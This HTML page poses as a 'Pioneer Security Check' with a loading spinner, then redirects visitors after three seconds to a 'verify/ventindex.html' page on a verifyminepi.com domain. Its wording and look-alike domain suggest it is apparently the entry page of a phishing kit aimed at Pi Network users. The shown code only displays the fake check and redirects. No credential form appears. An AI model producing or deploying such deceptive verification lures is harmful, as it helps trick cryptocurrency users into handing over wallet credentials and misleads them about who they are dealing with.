<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pioneer Security Check</title>
    <meta http-equiv="refresh" content="3; url=verifyminepi.com/verifyminepi/verify/ventindex.html">
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f9f9f9;
            font-family: Arial, sans-serif;
            text-align: center;
        }
        .loading-container {
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #ccc;
            border-top-color: #007bff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 10px;
        }
        @keyframes spin {
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
    <script>
        setTimeout(() => {
            window.location.href = "verify/ventindex.html";
        }, 3000);
    </script>
</head>
<body>
    <div class="loading-container">
        <div class="spinner"></div>
        <p>Pioneer Security Check... Please wait.</p>
    </div>
</body>
</html>
